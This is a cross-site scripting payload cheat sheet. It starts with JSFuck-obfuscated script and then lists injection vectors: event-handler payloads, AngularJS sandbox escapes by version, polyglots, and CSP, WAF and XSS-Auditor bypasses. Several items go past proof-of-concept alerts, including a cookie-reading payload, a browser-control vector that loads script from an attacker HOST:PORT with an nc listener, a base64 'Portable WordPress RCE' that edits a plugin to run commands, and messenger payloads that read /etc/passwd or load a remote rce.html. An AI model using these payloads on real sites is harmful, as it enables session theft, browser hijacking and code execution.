(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[] 



"><"<img src="x">%20%20>"<iframe src=evil.source>%20<iframe>


"><iframe src=a onload=alert("PENTEST") <

" src="><svg/onload=prompt(2)> ""input onfocus=alert(2)" autofocus>

" onfocus="alert(1)" autofocus

t" onmouseover=alert(/xss/); a="

%22onmouseover%3d%22alert(document.domain)%22style%3d%22position%3aabsolute%3bwidth%3a100%25%3bheight%3a100%25%3btop%3a0%3bleft%3a0%3b%22uo545

"><img src=x onerror=alert(/PTEST/)</script>
 "><img src=x onerror=prompt(23);>

<h>xxs link<a><img src="c" onerror=alert(1)>

<img src=x onerror=alert('h')><xmp>

<a onmouseover=alert(document.cookie)>xxs link</a>
<a onmouseover=alert(document.cookie)>%20<h>xxs link<a><iframe src="c" onload=alert(1)>

<div onactivate=alert('XSSTEST') id=xss style=overflow:scroll>

Ij48IjxpbWcgc3JjPSJ4Ij4lMjAlMjA+IjxpZnJhbWUgc3JjPWE+JTIwPGlmcmFtZT4=




String Char Eval
 {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}

  'a'.constructor.prototype['char\u0041t']

 'a'.constructor.prototype['char\u0041t']=''.concat;

{{'a'.constructor.prototype['char\u0041t']=''.concat;
$eval("x='\"+(y='if(!window\\u002?x)alert(window\\u002ex=1)')+eval(y)+\"'");}} 


{{
    ({}.toString()).constructor.prototype.charAt=[].join;
 $eval(({}.toString()).constructor.fromCharCode(120,61,49,125,32,125,32,125,59,97,108,101,114,116,40,49,41,47,47))
}}



{{
 x=toString();x.constructor.prototype.charAt=x.constructor.prototype.concat;
 $eval(x.constructor.fromCharCode(120,61,49,125,32,125,32,125,59,97,108,101,114,116,40,49,41,47,47))
}}



t=o.anchor(true);//<a name="true">[object Undefined]</a>



{{
c=[];
o=toString();
t=o.anchor(true);
f=o.anchor(false);
c.push(o[5]);
c.push(o[1]);
c.push(t[3]);
c.push(f[12]);
c.push(t[9]);
c.push(t[10]);
c.push(t[11]);
c.push(o[5]);
c.push(t[9]);
c.push(o[1]);
c.push(t[10]);
a=c.join([]);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[c.join([])].fromCharCode(97,108,101,114,116,40,49,41))()
}}



<!-- If you control the name, will work on Firefox in any context, will fail in chromium in DOM -->
<svg/onload=eval(name)>

<!-- If you control the URL, Safari-only -->
<iframe/onload=write(URL)>

<!-- If you control the URL -->
<svg/onload=eval(`'`+URL)>

<!-- If you controll the name, but unsafe-eval not enabled -->
<svg/onload=location=name>

<!-- Just a casual script -->
<script/src=//?.?></script>

<!-- If you control the name of the window -->
<iframe/onload=src=top.name>

<!-- If you control the URL -->
<iframe/onload=eval('`'+URL)>

<!-- If number of iframes on the page is constant -->
<iframe/onload=src=top[0].name+/\?.??/>

<!-- for Firefox only -->
<iframe/srcdoc="<svg><script/href=//?.? />">

<!-- If number of iframes on the page is random -->
<iframe/onload=src=contentWindow.name+/\?.??/>

<!-- If unsafe-inline is disabled in CSP and external scripts allowed -->
<iframe/srcdoc="<script/src=//?.?></script>">

<!-- If inline styles are allowed -->
<style/onload=eval(name)>

<!-- If inline styles are allowed, Safari only -->
<style/onload=write(URL)>

<!-- If inline styles are allowed and the URL can be controlled -->
<style/onload=eval(`'`+URL)>

<!-- If inline styles are blocked -->
<style/onerror=eval(name)>

<!-- Uses external script as import, doesn't work in innerHTML unless Firefox -->
<!-- The PoC only works on https and Chrome, because ?.? checks for Sec-Fetch-Dest header -->
<svg/onload=import(/\\?.?/)>

<!-- Uses external script as import,  triggers if inline styles are allowed.
<!-- The PoC only works on https and Chrome, because ?.? checks for Sec-Fetch-Dest header -->
<style/onload=import(/\\?.?/)>

<!-- Uses external script as import -->
<!-- The PoC only works on https and Chrome, because ?.? checks for Sec-Fetch-Dest header -->
<iframe/onload=import(/\\?.?/)>


HTML Context
Tag Injection 	<svg onload=alert(1)>
ì><svg onload=alert(1)//


HTML Context
Inline Injection 	ìonmouseover=alert(1)//
ìautofocus/onfocus=alert(1)//


Javascript Context
Code Injection 	ë-alert(1)-ë
ë-alert(1)//


Javascript Context
Code Injection
(escaping the escape) 	\í-alert(1)//


Javascript Context
Tag Injection 
</script><svg onload=alert(1)>


PHP_SELF Injection 	
http://DOMAIN/PAGE.php/î><svg onload=alert(1)>


Without Parenthesis 	
<svg onload=alert`1`>
<svg onload=alert&lpar;1&rpar;>
<svg onload=alert&#x28;1&#x29>
<svg onload=alert&#40;1&#41>


Filter Bypass
Alert Obfuscation 	
(alert)(1)
a=alert,a(1)
[1].find(alert)
top[ìalî+îertî](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top[ëal\145rtí](1)
top[ëal\x65rtí](1)
top[8680439..toString(30)](1)


Body Tag 	
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
<body onhashchange=alert(1)><a href=#x>click this!#x
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
<body onscroll=alert(1)><br><br><br><br>
<br><br><br><br><br><br><br><br><br><br>
<br><br><br><br><br><br><br><br><br><br>
<br><br><br><br><br><br><x id=x>#x
<body onresize=alert(1)>press F12!
<body onhelp=alert(1)>press F1! (MSIE)


Miscellaneous Vectors 	
<marquee onstart=alert(1)>
<marquee loop=1 width=0 onfinish=alert(1)>
<audio src onloadstart=alert(1)>
<video onloadstart=alert(1)><source>
<input autofocus onblur=alert(1)>
<keygen autofocus onfocus=alert(1)>
<form onsubmit=alert(1)><input type=submit>
<select onchange=alert(1)><option>1<option>2
<menu id=x contextmenu=x onshow=alert(1)>right click me!


Agnostic Event Handlers 	
<x contenteditable onblur=alert(1)>lose focus!
<x onclick=alert(1)>click this!
<x oncopy=alert(1)>copy this!
<x oncontextmenu=alert(1)>right click this!
<x oncut=alert(1)>copy this!
<x ondblclick=alert(1)>double click this!
<x ondrag=alert(1)>drag this!
<x contenteditable onfocus=alert(1)>focus this!
<x contenteditable oninput=alert(1)>input here!
<x contenteditable onkeydown=alert(1)>press any key!
<x contenteditable onkeypress=alert(1)>press any key!
<x contenteditable onkeyup=alert(1)>press any key!
<x onmousedown=alert(1)>click this!
<x onmousemove=alert(1)>hover this!
<x onmouseout=alert(1)>hover this!
<x onmouseover=alert(1)>hover this!
<x onmouseup=alert(1)>click this!
<x contenteditable onpaste=alert(1)>paste here!


Code Reuse
Inline Script 	<script>alert(1)//
<script>alert(1)<!ñ


Code Reuse
Regular Script 	<script src=//localhost:8080/1.js>
<script src=//3334957647/1>


Filter Bypass
Generic Tag + Handler 	
Encoding 	Mixed Case 	Spacers
%3Cx onxxx=1
<%78 onxxx=1
<x %6Fnxxx=1
<x o%6Exxx=1
<x on%78xx=1
<x onxxx%3D1 	<X onxxx=1
<x OnXxx=1
<X OnXxx=1Doubling
<x onxxx=1 onxxx=1 	<x/onxxx=1
<x%09onxxx=1
<x%0Aonxxx=1
<x%0Conxxx=1
<x%0Donxxx=1
<x%2Fonxxx=1
Quotes 	Stripping 	Mimetism
<x 1=í1íonxxx=1
<x 1=î1?onxxx=1 	<[S]x onx[S]xx=1


[S] = stripped char or string
<x </onxxx=1
<x 1=î>î onxxx=1
<http://onxxx%3D1/

Generic Source Breaking 	
<x onxxx=alert(1) 1=í


Browser Control 	
<svg onload=setInterval(function(){with(document)body.
appendChild(createElement(ëscriptí)).src=í//HOST:PORTí},0)>$ while :; do printf ìj$ ì; read c; echo $c | nc -lp PORT >/dev/null; done


Multi Reflection 	Double Reflection
Single Input 	Single Input (script-based)
ëonload=alert(1)><svg/1=í 	ë>alert(1)</script><script/1=í
*/alert(1)</script><script>/*

Triple Reflection
Single Input 	Single Input (script-based)
*/alert(1)î>íonload=î/*<svg/1=í
`-alert(1)î>íonload=î`<svg/1=í 	*/</script>í>alert(1)/*<script/1=í


Multi Input Double Input 	Triple Input
p=<svg/1=í&q=íonload=alert(1)> 	
p=<svg 1=í&q=íonload=í/*&r=*/alert(1)í>


Without Event Handlers 	
<script>alert(1)</script>
<script src=javascript:alert(1)>
<iframe src=javascript:alert(1)>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>click
<math><brute href=javascript:alert(1)>click
<form action=javascript:alert(1)><input type=submit>
<isindex action=javascript:alert(1) type=submit value=click>
<form><button formaction=javascript:alert(1)>click
<form><input formaction=javascript:alert(1) type=submit value=click>
<form><input formaction=javascript:alert(1) type=image value=click>
<form><input formaction=javascript:alert(1) type=image src=SOURCE>
<isindex formaction=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<svg><script xlink:href=data:,alert(1) />
<math><brute xlink:href=javascript:alert(1)>click
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>


Mobile Only 	
Event Handlers
<html ontouchstart=alert(1)>
<html ontouchend=alert(1)>
<html ontouchmove=alert(1)>
<html ontouchcancel=alert(1)>
<body onorientationchange=alert(1)>


Javascript Properties 	Functions
<svg onload=alert(navigator.connection.type)>
<svg onload=alert(navigator.battery.level)>
<svg onload=alert(navigator.battery.dischargingTime)>
<svg onload=alert(navigator.battery.charging)> 	<svg onload=navigator.vibrate(500)>
<svg onload=navigator.vibrate([500,300,100])>


Generic Self to Regular XSS 	
<iframe src=LOGOUT_URL onload=forms[0].submit()>
</iframe><form method=post action=LOGIN_URL>
<input name=USERNAME_PARAMETER_NAME value=USERNAME>
<input name=PASSWORD_PARAMETER_NAME value=PASSWORD>


File Upload 	Injection in Filename
ì><img src=1 onerror=alert(1)>.gifInjection in Metadata
$ exiftool -Artist='î><img src=1 onerror=alert(1)>í FILENAME.jpegInjection with SVG File
<svg xmlns=îhttp://www.w3.org/2000/svgî onload=îalert(document.domain)î/>


Injection with GIF File as Source of Script (CSP Bypass)
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;

Google Chrome
Auditor Bypass
<script src=îdata:&comma;alert(1)//
ì><script src=data:&comma;alert(1)//<script src=î//localhost:8080&sol;1.js&num;
ì><script src=//localhost:8080&sol;1.js&num;<link rel=import href=îdata:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
ì><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>

Chrome < v60 beta XSS-Auditor Bypass

<script src="data:,alert(1)%250A-->

Other Chrome XSS-Auditor Bypasses

<script>alert(1)</script

<script>alert(1)%0d%0a-->%09</script

<x>%00%00%00%00%00%00%00<script>alert(1)</script>

Safari XSS Vector

<script>location.href;'javascript:alert%281%29'</script>

XSS Polyglot

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

PHP File for XHR Remote Call 	
<?php header(ìAccess-Control-Allow-Origin: *î); ?>
<img src=1 onerror=alert(1)>
Server Log Avoidance 	<svg onload=eval(URL.slice(-8))>#alert(1)
<svg onload=eval(location.hash.slice(1)>#alert(1)
<svg onload=innerHTML=location.hash>#<script>alert(1)</script>

<svg/onload=javascript:void(0)?void(0):void(0)?void(0):void(0)?void(0):void(0)?void(0):confirm(location)> 


Shortest PoC 	
<base href=//0>


$ while:; do echo ìalert(1)î | nc -lp80; done
Portable WordPress RCE 	<script/src=îdata:&comma;eval(atob(location.hash.slice(1)))//&num;
#eD1uZXcgWE1MSHR0cFJlcXVlc3QoKQ0KcD0nL3dwLWFkbWluL3Bsd
Wdpbi1lZGl0b3IucGhwPycNCmY9J2ZpbGU9YWtpc21ldC9pbmRleC5w
aHAnDQp4Lm9wZW4oJ0dFVCcscCtmLDApDQp4LnNlbmQoKQ0KJD0n
X3dwbm9uY2U9JysvY2UiIHZhbHVlPSIoW14iXSo/KSIvLmV4ZWMoeC
5yZXNwb25zZVRleHQpWzFdKycmbmV3Y29udGVudD08Pz1gJF9HRV
RbYnJ1dGVdYDsmYWN0aW9uPXVwZGF0ZSYnK2YNCngub3BlbignUE
9TVCcscCtmLDEpDQp4LnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtVHl
wZScsJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpD
Qp4LnNlbmQoJCk=http://DOMAIN/WP-ROOT/wp-content/plugins/akismet/index.php?brute=CMD


Invisble JS Alert
([,?,,,,??]=[]+{},[???,??,????,???,,?????,????,??????,,,?????]=[!!?]+!?+?.?)
[??+=?+?????+??????+???+??+????+??+???+?+??][??]
(?????+????+???+??+???+'`#JS!`')``


Markdown XSS

[a](javascript:confirm(1))

[a](javascript://www.test.com%0Aprompt(1))

[a](javascript://%0d%0aconfirm(1))

[a](javascript://%0d%0aconfirm(1);com)

[a](javascript:window.onerror=confirm;throw%201)

[a]: (javascript:prompt(1))

[a]:(?javascript:alert(1))           


Angular JS
'a'.constructor.fromCharCode=[].join;
'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e'; 

{{
'a'.constructor.prototype.charAt=[].join;
eval('x=1} } };alert(1)//');
}}

AngularJS Template Injection based XSS

1.0.1 - 1.1.5

{{constructor.constructor('alert(1)')()}}

1.2.0 - 1.2.1

{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

1.2.2 - 1.2.5

{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}

1.2.6 - 1.2.18

{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}

1.2.19 - 1.2.23

{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}

1.2.24 - 1.2.29

{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}

1.3.0

{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}

1.3.1 - 1.3.2

{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf; 
    $eval('x=alert(1)//'); 
}}

1.3.3 - 1.3.18

{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 

  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}

1.3.19

{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
    $eval('x=alert(1)//'); 
}}

1.3.20

{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}

1.4.0 - 1.4.9

{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

1.5.0 - 1.5.8

{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}

1.5.9 - 1.5.11

{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}

1.6.0+ (no Expression Sandbox)

{{constructor.constructor('alert(1)')()}}

Content Security Policy (CSP) bypass via JSONP endpoints

Grab the target's CSP:

curl -I http://example.com | grep 'Content-Security-Policy'


Lightweight Markup Languages

RubyDoc (.rdoc)

XSS[JavaScript:alert(1)]

Textile (.textile)

"Test link":javascript:alert(1)

reStructuredText (.rst)

`Test link`__.

__ javascript:alert(document.domain)  

Unicode characters

Üáï<img src=a onerror=javascript:alert('test')>ÖâÄ



Sanbox Bypasses
{{constructor.constructor('alert(1)')()}}

{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}

{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}

{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}

{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}

{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}

{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf; 
    $eval('x=alert(1)//'); 
}}

{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 
  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}

{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
    $eval('x=alert(1)//'); 
}}

{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}

{{constructor.constructor('alert(1)')()}} 


Kona WAF (Akamai) Bypass

\');confirm(1);//

ModSecurity WAF Bypass Note: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html

<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>

Wordfence XSS Bypasses

<meter onmouseover="alert(1)"

'">><div><meter onmouseover="alert(1)"</div>"

>><marquee loop=1 width=0 onfinish=alert(1)>

Incapsula WAF Bypasses

<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>

<img/src=q onerror='new Function`al\ert\`1\``'>

jQuery < 3.0.0 XSS

$.get('http://sakurity.com/jqueryxss')

In order to really exploit this jQuery XSS you will need to fulfil one of the following requirements:

    Find any cross domain requests to untrusted domains which may inadvertently execute script.
    Find any requests to trusted API endpoints where script can be injected into data sources.

URL verification bypasses (works without &#x09; too)

javas&#x09;cript://www.google.com/%0Aalert(1)






Signal Messenger Payloads
http://testdomain/?p=%3Ciframe%20src="/etc/passwd"%3E%3C/iframe%3E%20PENTEST

http://testdomain/?p=%3d%3Ciframe%20src=\\DESKTOP-[LOCALPATH]\Temp\rce.html%3E

http://testdomain/?p=%3d%3Ciframe%20src=\\xxx.xxx.xxx.xxx\Temp\rce.html%3E

http://testdomain/?p=%3Ciframe%20src="testfile.html"%3E%3C/iframe%3E%20PENTEST

http://testdomain/?p=%3Ciframe%20srcdoc="<p>PENTEST</p>"%3E%3C/iframe%3E

http://testdomain/?p=%3Caudio%20autoplay%20src="/usr/share/sounds/gnome/default/alerts/bark.ogg"%20type="audio/ogg"%3E%3C/audio%3E

http://testdomain/?p=%3Cvideo%20autoplay%20loop%20src="/usr/share/help/C/gnome-help/figures/display-dual-monitors.webm"%20type="video/webm"%3E%3C/video%3E

http://testdomain/?p=%3Cform%20method='POST'%20action='https://domain.de/url'%3E%3Cinput%20type='text'%20name='data'%20value='from_form'/%3E%3Cinput%20type='submit'/%3E%3C/form%3E




Waf Engine Bypass
<svg onload\r\n=$.globalEval("al"+"ert()");>
<img onload\r\n=$.globalEval("al"+"ert()");>
<iframe src="\\" onload\r\n=$.globalEval("al"+"ert()");>
